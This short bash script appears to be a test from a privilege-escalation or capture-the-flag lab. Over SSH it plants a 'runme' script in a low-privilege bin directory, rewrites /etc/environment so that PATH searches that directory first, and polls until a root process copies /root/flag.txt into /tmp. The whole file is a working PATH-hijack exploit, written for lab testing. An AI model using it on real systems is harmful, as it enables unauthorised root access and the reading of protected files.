#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
rm -f /tmp/env_flag
mkdir -p /home/lowpriv/bin
cat > /home/lowpriv/bin/runme <<'\''EOF'\''
#!/bin/sh
cat /root/flag.txt > /tmp/env_flag
EOF
chmod 755 /home/lowpriv/bin/runme
printf "%s\n" "PATH=/home/lowpriv/bin:/usr/sbin:/usr/bin:/sbin:/bin" > /etc/environment
for i in $(seq 1 45); do
  if test -r /tmp/env_flag && grep -q FLAG /tmp/env_flag 2>/dev/null; then
    cat /tmp/env_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for environment hook" >&2
exit 1
')"
assert_root_output "${out}"
